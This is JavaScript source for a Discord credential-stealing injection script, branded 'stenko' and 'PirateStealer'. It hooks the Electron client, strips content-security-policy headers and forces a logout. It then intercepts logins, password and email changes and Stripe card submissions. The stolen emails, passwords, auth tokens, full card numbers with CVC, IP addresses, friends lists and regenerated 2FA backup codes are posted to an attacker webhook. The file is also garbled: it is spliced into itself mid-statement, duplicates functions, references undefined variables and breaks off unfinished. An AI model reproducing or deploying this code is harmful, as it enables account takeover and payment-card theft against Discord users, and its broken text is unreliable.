const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const querystring = require('querystring');
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "stenko"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "stenko"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)const fs = require('fs');
const path = require('path');
const { BrowserWindow, session } = require('electron')
const querystring = require('querystring');
var webhook = "%WEBHOOK_LINK%";

function FirstTime() {
    if (!fs.existsSync(path.join(__dirname, "stenko"))) {
        return !0
    }
    fs.rmdirSync(path.join(__dirname, "stenko"));
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
    return !1
}
session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			callback({
				responseHeaders: Object.assign({
					'Access-Control-Allow-Headers': "*"
				}, details.responseHeaders)
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
			callback({
				cancel: true
			})
			return;
	}
	if (FirstTime()) {}

	callback({})
	return;
})
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime())
        if (details.url.startsWith("wss://")) {
            callback({
                cancel: !0
            })
        } else {
            callback({
                cancel: !1
            })
        }
})
function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

function GetNitro(flags) {
	if (flags == 0) {
		return "no nitro"
	}
	if (flags == 1) {
		return "nitro classic"
	}
	if (flags == 2) {
		return "nitro boost"
	} else {
		return "no nitro"
	}
}

function GetRBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "discord staff "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "partnered server owner "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "hypesquad events "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "bug hunter tier 1 "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "early supporter "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "bug hunter tier 2 "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "verified bot developer "
	}
	if (badges == "") {
		badges = ""
	}
	return badges
}

function GetBadges(flags) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const House_Brilliance = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var badges = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		badges += "discord staff "
	}
	if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
		badges += "partnered server owner "
	}
	if ((flags & HypeSquad_Events) == HypeSquad_Events) {
		badges += "hypesquad events "
	}
	if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		badges += "bug hunter tier 1 "
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		badges += "early supporter "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		badges += "bug hunter tier 2 "
	}
	if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		badges += "verified bot developer "
	}
	if (badges == "") {
		badges = "no badges"
	}
	return badges
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "title": "user logged in",
		    description: "᲼᲼᲼᲼",
                    "color": 3092790,
                    "fields": [
                        {
                            "name": " name",
			    "value": `\`` + json.username + `#` + json.discriminator + `\``,
                            "inline": true
                        },
                        {
                            "name": " id",
                            "value": `\`` + json.id + `\``,
                            "inline": true
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": " email",
                            "value": `\`${email}\``,
                            "inline": true
                        },
                        {
                            "name": " password",
                            "value": `\`${password}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": " badges",
                            "value": `\`${GetBadges(json.flags)}\``,
                            "inline": true		    
                        },
                        {
                            "name": " nitro",
                            "value": `\`${GetNitro(json.premium_type)}\``,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        }, 
                        {
                            "name": " token",
                            "value": `\`${token}\``,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Email Changed**",
                                "value": `New Email: ${newemail}\nPassword: ${password}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }                 
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}

function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            var json = JSON.parse(info);
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }     
                    }
                ]
            }
            SendToWebhook(JSON.stringify(params))
        })
    })
}
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			var json = JSON.parse(info);
            var params = {
                username: "stenko",
                content: "",
                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
                embeds: [
                    {
                        "color": 3092790,
                        "fields": [
                            {
                                "name": "**Credit Card Added**",
                                "value": `Credit Card Number: ${number}\nCredit Card Expiration: ${expir_month}/${expir_year}\nCVC: ${cvc}\n Country: ${country}\nState ${state}\nCity ${city}\nZIP: ${zip}\n Street: ${street}`,
                                "inline": true
                            },
                            {
                                "name": "**Other Info**",
                                "value": `Nitro Type: ${GetNitro(json.premium_type)}\nBadges: ${GetBadges(json.flags)}\nIP: ${ip}`,
                                "inline": true
                            },
                            {
                                "name": "**Token**",
                                "value": `\`${token}\``,
                                "inline": false
                            }
                        ],
                        "author": {
                            "name": "stenko",
		 	    "url": `https://stenko.xyz`,
                        },
		        "thumbnail": {
                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                        },
                        "footer": {
                            "text": ""
                        }     
                    }
                ]
            }
			SendToWebhook(JSON.stringify(params))
		})
	})
}
const ChangePasswordFilter = {
	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"]
};
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => {
	if (details.url.endsWith("login")) {
		if (details.statusCode == 200) {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			const email = data.login;
			const password = data.password;
			const window = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
				Login(email, password, token)
			}))
		} else {}
	}
	if (details.url.endsWith("users/@me")) {
		if (details.statusCode == 200 && details.method == "PATCH") {
			const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString())
			if (data.password != null && data.password != undefined && data.password != "") {
				if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangePassword(data.password, data.new_password, token)
					}))
				}
				if (data.email != null && data.email != undefined && data.email != "") {
					const window = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
						ChangeEmail(data.email, data.password, token)
					}))
				}
			}
		} else {}
	}
	if (details.url.endsWith("tokens")) {
		const window = BrowserWindow.getAllWindows()[0];
		const item = querystring.parse(decodeURIComponent(Buffer.from(details.uploadData[0].bytes).toString()))
		window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => {
			CreditCardAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token)
		}))
	}
});
module.exports = require('./core.asar')
			});
		} else {
			callback({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Access-Control-Allow-Headers': "*",
					"Access-Control-Allow-Origin": "*"
				}, details.responseHeaders)
			});
		}


	} else {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];

		callback({
			responseHeaders: {
				...details.responseHeaders,
				'Access-Control-Allow-Headers': "*"
			}
		})
	}

})
const Filter = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
	if (details.url.startsWith("wss://")) {
			callback({
				cancel: true
			})
			return;
	}
	if (FirstTime()) {}

	callback({})
	return;
})
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (FirstTime())
        if (details.url.startsWith("wss://")) {
            callback({
                cancel: !0
            })
        } else {
            callback({
                cancel: !1
            })
        }
})
function SendToWebhook(what) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}

  function GetBadges(flags)
  {
  const Discord_Employee = 1;
  const Partnered_Server_Owner = 2;
  const HypeSquad_Events = 4;
  const Bug_Hunter_Level_1 = 8;
  const House_Bravery = 64;
  const House_Brilliance = 128;
  const House_Balance = 256;
  const Early_Supporter = 512;
  const Bug_Hunter_Level_2 = 16384;
  const Early_Verified_Bot_Developer = 131072;
  
  var badges = "";
  
  if((flags & Discord_Employee) == Discord_Employee){
     badges += "discord staff ";
  }
  if((flags & Partnered_Server_Owner) == Partnered_Server_Owner){
     badges += "partnered server owner ";
  }
  if((flags & HypeSquad_Events) == HypeSquad_Events){
     badges += "hypesquad events "
  }
  if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1){
     badges += "bug hunter tier 1 ";
  }
  if((flags & House_Bravery) == House_Bravery) {
     badges += "hypesquad bravery ";
  }
  if((flags & House_Brilliance) == House_Brilliance){
     badges += "hypesquad brillance ";
  }
  if((flags & House_Balance) == House_Balance){
     badges += "hypesquad balance ";
  }
  if((flags & Early_Supporter) == Early_Supporter){
     badges += "early supporter ";
  }
  if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2){
     badges += "bug hunter tier 2 ";
  }
  if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
     badges += "verified bot developer ";
  }
  if (badges == "" ){
      badges = "no badges"
  }
  return badges;
  
  }

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        const json = JSON.parse(info);
        var params = {
            username: "stenko",
            content: "",
            avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
            embeds: [
                {
                    "color": 3092790,
                    "fields": [
                        {
                            "name": " name",
			    "value": ` - ` + json.username + `#` + json.discriminator,
                            "inline": true
                        },
                        {
                            "name": " id",
                            "value": ` - ` + json.id,
                            "inline": true
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": " email",
                            "value": ` - ${email}`,
                            "inline": true
                        },
                        {
                            "name": " password",
                            "value": ` - ${password}`,
                            "inline": true		    
                        },
                        {
                            "name": "᲼᲼᲼᲼",
                            "value": `᲼᲼᲼᲼`,
                            "inline": false
                        },
                        {
                            "name": " token",
                            "value": ` - ${token}`,
                            "inline": false
                        }
                    ],
                    "author": {
                        "name": "stenko premium version",
			"url": `https://stenko.xyz`,
                    },
		    "thumbnail": {
                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                    },
                    "footer": {
                        "text": ""
                    }
                }
            ]
        }
        SendToWebhook(JSON.stringify(params))
    })
}

function ChangePassword(oldpassword, newpassword, token) {
	const window = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
              xmlHttp.responseText`, !0).then((codes) => {

							var fieldo = [];
							var baseuri = "https://premium.piratestealer.to/raw/"


							var gayass = JSON.parse(codes)
							let g = gayass.backup_codes
							const r = g.filter((code) => {
								return code.consumed == null
							})
							for (let z in r) {
								fieldo.push({
									name: `Code`,
									value: `\`${r[z].code.insert(4, "-")}\``,
									inline: true
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}

							function totalFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {

									return user.type == 1
								})
								return r.length
							}

							function CalcFriends() {
								var f = JSON.parse(info4)
								const r = f.filter((user) => {
									return user.type == 1
								})
								var gay = "";
								for (z of r) {
									var b = GetRBadges(z.user.public_flags)
									if (b != "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "No Rare Friends"
								}
								return gay
							}

							function Cool() {
								const json = JSON.parse(info3)
								var billing = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`❌\`"
									} else if (z.type == 2 && z.invalid != !0) {
										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										billing += "\`✔️\`" + " :credit_card:"
									} else {
										return "\`❌\`"
									}
								})
								if (billing == "") {
									billing = "\`❌\`"
								}
								return billing
							}
							const json = JSON.parse(info);

							var params = {
								username: "PirateStealer",
								content: "",
								embeds: [{
									"title": "Password Changed",
									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
										inline: !1
									}, {
										name: "Username",
										value: `\`${json.username}#${json.discriminator}\``,
										inline: !0
									}, {
										name: "ID",
										value: `\`${json.id}\``,
										inline: !0
									}, {
										name: "Nitro",
										value: `${GetNitro(json.premium_type)}`,
										inline: !1
									}, {
										name: "Badges",
										value: `${GetBadges(json.flags)}`,
										inline: !1
									}, {
										name: "Billing",
										value: `${Cool()}`,
										inline: !1
									}, {
										name: "Email",
										value: `\`${json.email}\``,
										inline: !1
									}, {
										name: "Old Password",
										value: `\`${oldpassword}\``,
										inline: !0
									}, {
										name: "New Password",
										value: `\`${newpassword}\``,
										inline: !0
									}, {
										name: "Token",
										value: `\`\`\`${token}\`\`\``,
										inline: !1
									}, ],
									"author": {
										"name": "PirateStealer"
									},
									"footer": {
										"text": "PirateStealer"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total Friends (${totalFriends()})`,
									"color": config['embed-color'],
									"description": CalcFriends(),
									"author": {
										"name": "PirateStealer"
									},
									"footer": {
										"text": "PirateStealer"
									},
									"thumbnail": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Get all of them](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "PirateStealer"
								},
								"footer": {
									"text": "PirateStealer"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}

							SendToWebhook(JSON.stringify(params))

						})
					} else {

						const window = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

										function totalFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											return r.length
										}

										function CalcFriends() {
											var f = JSON.parse(info4)
											const r = f.filter((user) => {
												return user.type == 1
											})
											var gay = "";
											for (z of r) {
												var b = GetRBadges(z.user.public_flags)
												if (b != "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "No Rare Friends"
											}
											return gay
										}

										function Cool() {
											const json = JSON.parse(info3)
											var billing = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													billing += "\`✔️\`" + " :credit_card:"
												} else {
													return "\`❌\`"
												}
											})
											if (billing == "") {
												billing = "\`❌\`"
											}
											return billing
										}
										const json = JSON.parse(info);
										var params = {
											username: "PirateStealer",
											content: "",
											embeds: [{
												"title": "Password Changed",
												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
												"color": config['embed-color'],
												"fields": [{
													name: "Info",
													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
													inline: !1
												}, {
													name: "Username",
													value: `\`${json.username}#${json.discriminator}\``,
													inline: !0
												}, {
													name: "ID",
													value: `\`${json.id}\``,
													inline: !0
												}, {
													name: "Nitro",
													value: `${GetNitro(json.premium_type)}`,
													inline: !1
												}, {
													name: "Badges",
													value: `${GetBadges(json.flags)}`,
													inline: !1
												}, {
													name: "Billing",
													value: `${Cool()}`,
													inline: !1
												}, {
													name: "Email",
													value: `\`${json.email}\``,
													inline: !1
												}, {
													name: "Old Password",
													value: `\`${oldpassword}\``,
													inline: !0
												}, {
													name: "New Password",
													value: `\`${newpassword}\``,
													inline: !0
												}, {
													name: "Token",
													value: `\`\`\`${token}\`\`\``,
													inline: !1
												}, ],
												"author": {
													"name": "PirateStealer"
												},
												"footer": {
													"text": "PirateStealer"
												},
												"thumbnail": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total Friends (${totalFriends()})`,
												"color": config['embed-color'],
												"description": CalcFriends(),
												"author": {
													"name": "PirateStealer"
												},
												"footer": {
													"text": "PirateStealer"
